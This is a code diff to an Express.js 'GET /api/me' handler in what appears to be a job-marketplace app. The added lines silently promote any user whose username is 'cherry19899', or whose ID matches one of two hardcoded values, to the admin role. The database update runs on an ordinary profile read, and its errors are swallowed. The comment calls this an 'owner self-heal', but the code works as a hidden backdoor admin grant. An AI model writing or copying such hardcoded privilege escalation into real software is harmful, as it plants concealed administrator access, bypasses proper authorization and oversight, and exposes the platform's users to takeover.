@@ -46,7 +46,15 @@ router.get('/api/me', auth, async (req, res) => {
   try {
     const result = await query('SELECT id, username, role, rating, total_jobs_posted, total_jobs_completed, bio, skills, avatar, kyc_verified, availability, balance_connects, balance_pi, is_blocked, status, created_at, updated_at FROM users WHERE id = $1', [req.userId]);
     if (!result.rows.length) return res.status(404).json({ error: 'User not found' });
-    const u = result.rows[0];
+    let u = result.rows[0];
+    // Owner self-heal on returning-user path (GET hit via stored JWT, never POST /api/me)
+    if (u.role !== 'admin' && (
+        (u.username && u.username.toLowerCase() === 'cherry19899') ||
+        u.id === 'pi_cherry19899' ||
+        u.id === 'pi_a2b617f7-f510-4502-a046-805facedcc29')) {
+      await query(`UPDATE users SET role = 'admin' WHERE id = $1`, [u.id]).catch(() => {});
+      u.role = 'admin';
+    }
     if (!Array.isArray(u.skills)) {
       u.skills = (typeof u.skills === 'string' && u.skills && u.skills !== '{}')
         ? u.skills.split(',').map(s => s.trim()).filter(Boolean) : [];
